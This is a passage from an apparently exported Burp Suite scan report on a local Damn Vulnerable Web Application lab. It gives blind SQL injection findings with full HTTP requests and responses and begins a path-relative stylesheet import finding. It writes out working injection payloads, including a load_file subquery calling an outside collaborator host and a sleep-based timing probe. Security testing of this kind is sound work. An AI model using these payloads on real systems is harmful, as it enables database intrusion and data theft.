  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="26.1.1">26.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/ [id parameter]</span>
<br><a class="PREVNEXT" href="#25.1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#26.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli_blind/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\vutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net\\gyz'))+'</b> was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the id parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>21</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.</span>
<h2>Remediation detail</h2>
<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=936434<span class="HIGHLIGHT">'%2b(select%20load_file('%5c%5c%5c%5cvutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net%5c%5cgyz'))%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=g2rbd2nvmtdp3m7tjo36a7vq48<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=460783&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:36:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type AAAA for the domain name <b>vutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.70.82 at 2022-Mar-11 07:36:50 UTC.</span><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 640<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught mysqli_sql_exception: <span class="HIGHLIGHT">You have an error in your SQL syntax</span>; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''744541''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli_blind\source\low.php:12<br>Stack trac<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">''</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 4</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">'%2b(select*from(select(sleep(20)))a)%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 4</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="26.1.2">26.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/ [id parameter]</span>
<br><a class="PREVNEXT" href="#26.1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.3.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli_blind/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\vutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net\\gyz'))+'</b> was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the id parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>21</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.</span>
<h2>Remediation detail</h2>
<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=936434<span class="HIGHLIGHT">'%2b(select%20load_file('%5c%5c%5c%5cvutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net%5c%5cgyz'))%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=g2rbd2nvmtdp3m7tjo36a7vq48<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=460783&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:36:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type AAAA for the domain name <b>vutzja7dk50mcq3r060gudnxoouiin6e920pqdf.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.70.82 at 2022-Mar-11 07:36:50 UTC.</span><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 640<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught mysqli_sql_exception: <span class="HIGHLIGHT">You have an error in your SQL syntax</span>; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''744541''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli_blind\source\low.php:12<br>Stack trac<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">''</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 4</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/?id=744541<span class="HIGHLIGHT">'%2b(select*from(select(sleep(20)))a)%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lfkqif1mpbr79vcag61kmo5n2h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli_blind/?id=908835&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 4</h2>
<div class="rr_div"><span>HTTP/1.1 404 Not Found<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4161<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="26.2">26.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#26.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli_blind/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=f5oq2fst9t6hc9jfvdmfbbcipl<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:56 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli_blind/<span class="HIGHLIGHT">index.php/czsupa/iteb5b/lcdagn/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=f5oq2fst9t6hc9jfvdmfbbcipl<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
